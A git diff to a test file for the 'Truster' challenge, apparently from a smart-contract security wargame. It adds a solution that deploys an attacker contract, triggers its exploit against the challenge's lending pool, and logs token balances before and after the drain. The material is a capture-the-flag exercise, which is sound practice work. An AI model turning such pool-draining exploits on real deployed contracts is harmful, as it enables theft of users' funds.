@@ -29,6 +29,31 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        // deploy the contract
+        const ExploitReceiver = await ethers.getContractFactory('ExploitReceiver', attacker);
+        this.attackerContract = await ExploitReceiver.deploy(this.token.address, this.pool.address);
+
+        //Attack
+        console.log(
+            'Receiver balance before attacking: ',
+            String(await this.token.balanceOf(attacker.address))
+        );
+        console.log(
+            "Exploit balance before attacking: ",
+            String(await this.token.balanceOf(this.attackerContract.address))
+        );
+
+        await this.attackerContract.connect(attacker);
+        await this.attackerContract.exploit(attacker.address);
+
+        console.log(
+            "Receiver balance after attacking: ",
+            String(await this.token.balanceOf(attacker.address))
+        );
+        console.log(
+            "Exploit balance after attacking: ",
+            String(await this.token.balanceOf(this.attackerContract.address))
+        );
     });
 
     after(async function () {
